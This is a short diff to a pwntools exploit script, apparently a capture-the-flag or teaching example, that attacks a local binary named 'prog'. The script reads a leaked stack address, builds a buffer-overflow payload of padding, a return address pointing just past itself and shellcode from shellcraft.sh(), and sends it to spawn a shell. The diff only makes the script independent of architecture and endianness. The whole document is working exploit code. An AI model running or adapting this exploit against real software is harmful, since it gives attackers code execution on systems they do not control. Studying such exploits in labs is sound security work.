@@ -1,14 +1,13 @@
 from pwn import *
 
-context.clear(arch='amd64')
-
 p = process('./prog')
+context.clear(arch=p.elf.arch, endian=p.elf.endian)
 
 p.readuntil('at')
 addr = int(p.readline(), 0)
 
-payload = 'A'*9
-payload += p64(addr + 9 + 8)
+payload = 'A'*(1+context.bytes)
+payload += pack(addr + len(payload) + context.bytes)
 payload += asm(shellcraft.sh())
 
 p.sendline(payload)
